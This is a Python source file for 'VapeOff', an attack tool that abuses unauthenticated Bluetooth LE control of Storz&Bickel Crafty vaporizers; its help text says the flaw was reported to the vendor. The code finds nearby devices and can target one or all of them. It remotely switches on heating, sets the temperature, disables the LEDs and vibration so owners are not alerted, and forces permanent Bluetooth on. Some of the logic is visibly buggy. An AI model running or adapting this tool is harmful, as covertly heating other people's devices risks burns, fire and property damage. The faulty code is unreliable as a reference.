import gatt
from bitstring import BitArray
import argparse
import re
import subprocess
import os
from time import sleep, time
import threading

# for interactivity
from queue import Queue, Empty
from enum import IntEnum
import readchar

Silence_Devices = False
Permanent_Bluetooth = False
Vibrate_Devices = False
List_Devices = False
Heat = False
Target = None
Verbose = False
Interface = "hci0"
Temp = None

manager = None
discovery_manager = None

running = True
stopped = False

lock = threading.Lock()


cdevices = 0

actions = Queue()


class Actions(IntEnum):
    IncreaseTemp = 0
    DecreaseTemp = 1


class DiscoveryManager(gatt.DeviceManager):

    def __init__(self, adapter_name):
        super().__init__(adapter_name)

        self.known_devices = []
        self.black_list = []

    def device_discovered(self, device):
        if device.alias() == "STORZ&BICKEL" and running:

            if List_Devices:
                if not device.mac_address in self.known_devices:  # Print each device only once
                    print("[I] Found device {}".format((device.mac_address)))
                    self.known_devices.append(device.mac_address)

            if not device.mac_address in self.black_list and\
                    Target != None and\
                    (Target == "all" or Target.lower() == device.mac_address.lower()):

                # Connect to device if Target is set or all and the device is not in the blacklist
                device2 = CraftyDevice(
                    mac_address=device.mac_address, manager=discovery_manager)
                device2.connect()


class CraftyDevice(gatt.Device):
    def __init__(self, mac_address, manager, managed=True):
        super().__init__(mac_address, manager, managed)
        self.ready_led = None
        self.ready_vib = None
        self.set_perm = None
        self.modell = None
        self.c1c3 = None
        self.last = 0
        self.on = False
        self.last_on_update = 0
        self.last_set_perm_update = 0

    def connect_succeeded(self):
        super().connect_succeeded()
        print("[I] Device ({}) connected".format(self.mac_address))
        global cdevices, Silence_Devices, Permanent_Bluetooth
        # If we don't want to change it, it's already ready
        self.ready_vib = not Silence_Devices
        # If we don't want to change it, it's already ready
        self.ready_led = not Silence_Devices
        # If we don't want to change it, it's already ready
        self.set_perm = Permanent_Bluetooth
        lock.acquire()
        cdevices += 1
        lock.release()

    def connect_failed(self, error):
        super().connect_failed(error)

    def disconnect_succeeded(self):
        global cdevices, running
        super().disconnect_succeeded()
        print("[I] Device ({}) disconnected".format(self.mac_address))
        lock.acquire()
        cdevices -= 1
        lock.release()
        if cdevices < 1 and not running:
            self.manager.stop()
            global stopped

            # setting stopped, to inform the main thread, that we successfully disconnected all devices and stopped the device manager
            lock.acquire()
            stopped = True
            lock.release()

    def characteristic_write_value_succeeded(self, characteristic=None):
        super().characteristic_write_value_succeeded(characteristic)
        characteristic.read_value()

    def characteristic_write_value_failed(self, error=None, characteristic=None):
        super().characteristic_write_value_failed(error, characteristic)
        characteristic.read_value()

    def services_resolved(self):
        super().services_resolved()
        for service in self.services:
            for characteristic in service.characteristics:
                if characteristic.uuid == "00000022-4c45-4b43-4942-265a524f5453":
                    characteristic.read_value()  # get modell
                if Temp != None:
                    if characteristic.uuid == "00000021-4c45-4b43-4942-265a524f5453":
                        if Verbose:
                            self.setTemp(Temp, characteristic=characteristic)
                            print("[I] Setting target temperature of device ({}) to {}".format(
                                self.mac_address, Temp*10))

    def setTemp(self, temp, characteristic=None):
        if not verifyTemp(temp):
            return False

        char = characteristic
        if char == None or char.uuid != "00000021-4c45-4b43-4942-265a524f5453":
            char = self.getCharacteristic(
                "00000021-4c45-4b43-4942-265a524f5453")

        characteristic.write_value(
            (temp * 10).to_bytes(2, byteorder="little"))

        if Verbose:
            print("[I] Setting target temperature of device ({}) to {}".format(
                self.mac_address, temp*10))
        return True

    def setBrightness(self, value, characteristic=None):
        if self.c1c3 == None:
            return False
        # Make sure Brightness is between 0 and 100
        val = value
        if value > 100:
            val = 100
        elif value < 0:
            val = 0

        char = characteristic
        if char == None or char.uuid != "00000051-4c45-4b43-4942-265a524f5453":
            char = self.getCharacteristic(
                "00000051-4c45-4b43-4942-265a524f5453")

        char.write_value((val).to_bytes(2, byteorder="little")
                         )  # write value to characteristic
        return True

    def setVibration(self, characteristic=None, on=False):
        if self.c1c3 == None:
            return False
        mask = BitArray('0b0000000100000000') if not on else BitArray(
            '0b1111111011111111')

        char = characteristic
        if char == None or char.uuid != "000001c3-4c45-4b43-4942-265a524f5453":
            char = self.getCharacteristic(
                "000001c3-4c45-4b43-4942-265a524f5453")

        if on:
            # Setting the 8. bit to 1 to activate Vibrations
            self.c1c3 = (self.c1c3 & mask)
        else:
            # Setting the 8. bit to 0 to deactivate Vibrations
            self.c1c3 = (self.c1c3 | mask)
        char.write_value(self.c1c3.bytes)
        return True

    def setPermanentBluetooth(self, characteristic=None, on=True):
        if self.c1c3 == None:
            return False

        char = characteristic
        if char == None or char.uuid != "000001c3-4c45-4b43-4942-265a524f5453":
            char = self.getCharacteristic(
                "000001c3-4c45-4b43-4942-265a524f5453")

        mask = BitArray('0b0000000000010000') if on else BitArray(
            '0b1111111111101111')

        if on:
            # Setting the 8. bit to 1 to activate Permanent Bluetooth
            self.c1c3 = (self.c1c3 & mask)
        else:
            # Setting the 8. bit to 0 to deactivate Permanent Bluetooth
            self.c1c3 = (self.c1c3 | mask)
        characteristic.write_value(self.c1c3.bytes)
        return True

    def findMyCrafty(self, characteristic=None):
        if self.c1c3 == None:
            return False
        char = characteristic
        if char == None or char.uuid != "000001c3-4c45-4b43-4942-265a524f5453":
            char = self.getCharacteristic(
                "000001c3-4c45-4b43-4942-265a524f5453")

        # Setting the 5. bit to 1 to activate find my crafty
        characteristic.write_value(
            (self.c1c3 | BitArray('0b0000100000000000')).bytes)

        return True

    def getCharacteristic(self, uuid):
        for service in self.services:
            for characteristic in service.characteristics:
                if characteristic.uuid == uuid:
                    return characteristic

    def turnOn(self, characteristic=None):
        if self.on == False:
            char = characteristic
            if char == None or char.uuid != "00000081-4c45-4b43-4942-265a524f5453":
                char = self.getCharacteristic(
                    "00000081-4c45-4b43-4942-265a524f5453")
            char.write_value(bytes(2))
            self.on = True

    def turnOff(self, characteristic=None):
        if self.on == True:
            char = characteristic
            if char == None or char.uuid != "00000091-4c45-4b43-4942-265a524f5453":
                char = self.getCharacteristic(
                    "00000091-4c45-4b43-4942-265a524f5453")
            char.write_value(bytes(2))
            self.on = False

    def characteristic_value_updated(self, characteristic, value):
        global actions, Temp, Target

        if Target is not None and Target != "all":
            if characteristic.uuid == "00000011-4c45-4b43-4942-265a524f5453":
                if Verbose:
                    print("[I] Current Temp on device ({}) is {}".format(
                        self.mac_address, value))

        if characteristic.uuid == "00000022-4c45-4b43-4942-265a524f5453" and self.modell == None:
            self.modell = "".join(map(chr, value)).strip()

            if self.modell == "Crafty":

                # subscribe to needed Characteristics and Temp Characteristic (00000011). 00000011 is changed on a frequent basis, so we can use it to perform checks regularly
                for service in self.services:
                    for characteristic2 in service.characteristics:
                        if characteristic2.uuid in ["00000011-4c45-4b43-4942-265a524f5453", "00000093-4c45-4b43-4942-265a524f5453", "000001c3-4c45-4b43-4942-265a524f5453", "00000051-4c45-4b43-4942-265a524f5453", "000001E3-4C45-4B43-4942-265A524F5453", "00000062-4C45-4B43-4942-265A524F5453"]:
                            characteristic2.read_value()
                            characteristic2.enable_notifications()
            else:
                print("[E] Device ({}) is based on an unsupported modell".format(
                    self.mac_address))
                self.manager.black_list.append(self.mac_address)
                self.disconnect()

        if characteristic.uuid == "00000093-4c45-4b43-4942-265a524f5453":  # device status
            c93 = BitArray(hex=value.hex())  # Status is represented in binary

            # Loop through all characteristics to find 00000081 or 00000091, depending on 'Heat'
            if time() - self.last_on_update > .5:
                self.on == c93[3]
                if self.ready_led and self.ready_vib:  # Only turn device on/off if everything is ready
                    if Heat:
                        self.turnOn()
                    else:
                        self.turnOff()
                    print("[I] Turned device ({}) {}".format(
                        self.mac_address, "on" if self.on else "off"))
                self.last_on_update = time()
        elif characteristic.uuid == "00000051-4c45-4b43-4942-265a524f5453":  # Led Brightness
            if not self.ready_led:  # Do we want to deactivate the led?
                self.ready_led = self.setBrightness(
                    0, characteristic=characteristic)
                if Verbose:
                    print("[I] Deactivated LEDs on device ({})".format(
                        self.mac_address))

        elif characteristic.uuid == "000001c3-4c45-4b43-4942-265a524f5453":  # read Settings
            self.c1c3 = BitArray(hex=value.hex())  # Settings
            if not self.ready_vib:  # Do we want to deactivate Vibrations?
                # If we failed to set it, retry it
                self.ready_vib = self.setVibration(characteristic)
                if Verbose:
                    print("[I] Deactivated vibrations and charging LEDs on device ({})".format(
                        self.mac_address))

            # Do we want to  activate "Find My Crafty" on the devices (led blinks, vibrating)?
            elif Vibrate_Devices:
                self.findMyCrafty(characteristic)
                if Verbose:
                    print("[I] Vibrating device ({})".format(self.mac_address))

            if Permanent_Bluetooth:  # Do we want to activate permanent Bluetooth?
                if self.set_perm == True:
                    self.set_perm = not self.setPermanentBluetooth(
                        characteristic)
                    if Verbose:
                        print("[I] Enabling permanent bluetooth on device ({})".format(
                            self.mac_address))

        # Script exiting, disconnect devices, deactivate device manager
        if running == False:

            global cdevices
            for d in self.manager.devices():
                try:
                    d.disconnect()
                except Exception as e:
                    print(e)
                    lock.acquire()
                    cdevices -= 1
                    lock.release()

        # Only interactive if a Mac is specified
        if Target is not None and Target != "all":
            try:
                while True:
                    action = actions.get_nowait()
                    print("Got action: {}".format(action))
                    if action["action"] is Actions.IncreaseTemp or action["action"] is Actions.DecreaseTemp:
                        new_temp = 0 + \
                            action["value"] if action["action"] is Actions.IncreaseTemp else 0 - \
                            action["value"]

                        if verifyTemp(new_temp):
                            Temp = new_temp
                            self.setTemp(Temp)

            except Empty:
                if Verbose:
                    print("[I] No actions left on device ({})".format(
                        self.mac_address))

        if time() - self.last > 1:
            for service in self.services:
                for characteristic2 in service.characteristics:
                    if characteristic2.uuid == "00000011-4c45-4b43-4942-265a524f5453":
                        characteristic2.read_value()
            self.last = time()


def verifyMac(mac):
    # Verify that the mac is formatted correctly, else return None
    return mac if re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", mac.lower()) else None


def verifyTemp(temp):
    return int(temp) if int(temp) > 80 and int(temp) <= 210 else None


def thread():
    global manager, discovery_manager, Interface

    manager = gatt.DeviceManager(
        adapter_name=Interface)  # Creating Device Manager
    discovery_manager = DiscoveryManager(
        adapter_name=Interface)  # Creating Discovery Manager

    discovery_manager.start_discovery()  # search for devices
    discovery_manager.run()


def createParser():
    parser = argparse.ArgumentParser(description='VapeOff is a tool which uses the lack of authentication in the communication protocol, to controll vaporizers (at the moment only the Crafty) from Storz&Bickel. The issue was reported to Storz&Bickel on 15 August 2019. It was discovered while programming the console application storzcrafty (https://github.com/jn4kr/storzcrafty).', formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    parser.add_argument('-i', '--interface', default="hci0",
                        help="specify interface")
    parser.add_argument('-m', '--mac', default=None,
                        help="specify target mac", type=verifyMac)
    parser.add_argument('-a', '--all', action='store_true',
                        help='attack all devices in area, overwrites \'--mac\'')
    parser.add_argument('-o', '--heat', action='store_true',
                        help='start device(s)')
    parser.add_argument('-p', '--perm', action='store_true',
                        help='enable permanent bluetooth')
    parser.add_argument('-s', '--silent', action='store_true',
                        help='deactivate vibration and LEDs of devices')
    parser.add_argument('-f', '--vibrate', action='store_true',
                        help='let devices vibrate')
    parser.add_argument('-t', '--target_temp', default=None,
                        help='sets the target temperature', type=verifyTemp)
    parser.add_argument('-l', '--list-devices', action='store_true',
                        help='run discovery and print macs of supported devices in the area. Can be combined with \'--mac\' and \'--all\'')

    parser.add_argument('-v', '--verbose', action='store_true')
    return parser


def parse(parser):
    global Silence_Devices, Heat, Vibrate_Devices, Permanent_Bluetooth, Target, manager, discovery_manager, Verbose, List_Devices, Temp, Interface

    args = parser.parse_args()

    if args.all or args.mac != None or args.list_devices:
        # setting globals
        lock.acquire()

        Interface = args.interface
        Heat = args.heat
        Silence_Devices = args.silent
        Vibrate_Devices = args.vibrate
        Permanent_Bluetooth = args.perm
        Verbose = args.verbose
        List_Devices = args.list_devices
        Temp = args.target_temp
        if not args.all:
            Target = args.mac
        else:
            Target = "all"

        lock.release()
    return args


def printHeader():
    print(
        "           ┌───────────────────────────────────────────────┐",
        "           │ __      __               ____  ______ ______  │",
        "           │ \ \    / /              / __ \|  ____|  ____| │",
        "           │  \ \  / /_ _ _ __   ___| |  | | |__  | |__    │",
        "           │   \ \/ / _` | '_ \ / _ \ |  | |  __| |  __|   │",
        "           │    \  / (_| | |_) |  __/ |__| | |    | |      │",
        "           │     \/ \__,_| .__/ \___|\____/|_|    |_|      │",
        "           │             | |                               │",
        "           │             |_|                               │",
        "           └───────────────────────────────────────────────┘ ",
        "",
        sep="\n"
    )


def main():
    global running, stopped, cdevices, Target, actions
    parser = createParser()
    args = parse(parser)
    if Target:
        try:
            t = threading.Thread(target=thread, args=())
            t.start()

            if Target is not None and Target != "all":
                while True:

                    c = readchar.readchar()
                    print("[I] Key {} was pressed".format(c))
                    if c == "+":
                        actions.put(
                            {"action": Actions.IncreaseTemp, "value": 5})  # no Lock needed as Qeue is threadsafe
                    elif c == "-":
                        actions.put(
                            {"action": Actions.DecreaseTemp, "value": 5})  # no Lock needed as Qeue is threadsafe
                    elif c == "e":
                        break
            else:
                while True:
                    sleep(1)

        except Exception as e:
            print(e)
            parser.print_help()
        except KeyboardInterrupt:
            pass
        finally:

            lock.acquire()
            # Stopping script
            running = False
            lock.release()

            if cdevices != 0:
                print("[I] Waiting for devices to disconnect")
                while not stopped:
                    sleep(.25)
            t.join()
    else:
        parser.print_help()


if __name__ == "__main__":
    printHeader()
    main()
